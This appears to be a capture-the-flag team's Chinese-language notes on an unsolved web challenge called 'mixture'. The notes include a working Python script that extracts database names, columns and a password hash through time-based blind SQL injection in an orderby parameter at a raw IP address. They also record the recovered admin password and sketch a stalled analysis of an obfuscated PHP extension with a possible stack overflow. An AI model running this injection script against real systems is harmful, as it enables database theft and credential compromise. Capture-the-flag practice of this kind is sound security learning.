# mixture

Working: Z xiao, xiangzhi Zhang, Y1ng LM
状态: Stuck 🤦‍♂️
类型: Web
题目: http://134.175.185.244/

benchmark延时注入：

```python
#!/usr/bin/env python3
#-*- coding:utf-8 -*-
#__author__: 颖奇L'Amore www.gem-love.com

import requests
import time as t
from urllib.parse import quote

url = 'http://134.175.185.244/member.php?orderby='
alphabet = [',','a','T','b','c','d','e','f','j','h','i','g','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','G','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9']
#your sql query here:
sql = 'select database()' #TesT
sql = "select group_concat(table_name) from information_schema.tables where table_schema=database()" #member,users
sql = 'select group_concat(column_name) from information_schema.columns where table_schema=database()' #id, username, password
sql = 'select password from member' #18a960a3a0b3554b314ebe77fe545c85 md5解密goodlucktoyou
result = ''
for i in range(1,30):
    for char in alphabet:
        payload = "and case when (FIELD(substr(({}),{},1),'{}')=1) then (benchmark(100000,sha1(sha(sha(1))))) else 0 end;".format(sql, i, char)
        # payload = quote(payload)

        #time
        start = int(t.time())
        r = requests.get(url+payload)
        end = int(t.time()) - start

        if end >= 3:
            result += char
            print(result)
            break
        # else:
        #     print(url+payload)
```

admin , goodlucktoyou 登陆之后有phpinfo有文件读取，有php扩展，一个so文件，webpwn不会做了

可以读取到select.php

```jsx
if($_SESSION['admin']==1&&!empty($search)){
       //var_dump(urldecode($search));
       Minclude(urldecode($search));
       //lookup($search);
}
```

下一步分析so弄清楚Minclude

分析Minclude.so文件，定位到zif_Minclude函数，发现被花指令混淆

解花指令后发现代码可能存在栈溢出...

不会了orz.....